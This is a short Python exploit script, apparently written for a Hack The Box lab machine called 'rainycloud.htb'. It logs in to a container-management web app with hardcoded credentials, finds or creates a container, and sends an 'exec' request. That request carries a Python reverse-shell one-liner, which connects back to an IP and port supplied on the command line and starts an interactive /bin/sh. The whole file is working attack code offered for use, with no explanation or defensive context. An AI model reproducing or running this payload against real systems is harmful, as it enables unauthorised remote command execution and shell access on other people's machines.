import requests
import sys
import re

session = requests.Session()

class rshell:

	def __init__(self,ip,port):
		self.local_ip = ip
		self.local_port = port
		self.login_url = f"http://rainycloud.htb/login"
		self.container_url = f"http://rainycloud.htb/containers"
		self.auth = {"username":"gary","password":"rubberducky"}

	def UserLogin(self):
		r = session.post(url=self.login_url,data=self.auth)
		print("[+] Login as user gary")

	def FindContainerId(self):
		r = session.get(url=self.container_url)
		ID = re.findall("[A-Fa-f0-9]{64}",r.text)
		return ID

	def RunCommand(self,ContainerID):
		RawCommand = f"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.local_ip}\",{self.local_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"
		payload = f"python3 -c \'{RawCommand}\'"
		data = data = {"action":"exec "+ payload,"id": ContainerID[0]}
		r = session.post(url=self.container_url,data=data)
		print("[+] Code Executed")


	def CreateContainer(self,ContainerName="new"):
		data = {"action":"create"+ ContainerName,"id":"alpine-python"}
		r = session.post(url=self.container_url,data=data)
		print("[+] Container Created")
		Containerid = self.FindContainerId()
		self.RunCommand(Containerid)


Rainycloud = rshell(sys.argv[1],sys.argv[2])
print("[+] Trying to login")
Rainycloud.UserLogin()

ContainerID = Rainycloud.FindContainerId()

if not ContainerID:
	Rainycloud.CreateContainer()
else:
	Rainycloud.RunCommand(ContainerID)